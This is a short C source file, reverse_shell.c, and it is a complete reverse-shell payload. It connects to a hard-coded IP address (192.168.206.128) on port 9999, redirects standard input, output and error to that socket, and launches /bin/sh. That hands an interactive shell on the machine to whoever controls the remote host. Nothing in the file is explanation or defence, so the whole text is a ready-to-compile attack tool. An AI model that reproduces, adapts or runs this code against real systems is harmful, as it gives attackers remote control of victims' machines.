// reverse_shell.c
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9999); 
    addr.sin_addr.s_addr = inet_addr("192.168.206.128"); 
    // addr.sin_addr.s_addr = inet_addr("127.0.0.1"); 

    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr

    execve("/bin/sh", NULL, NULL);
    return 0;
}
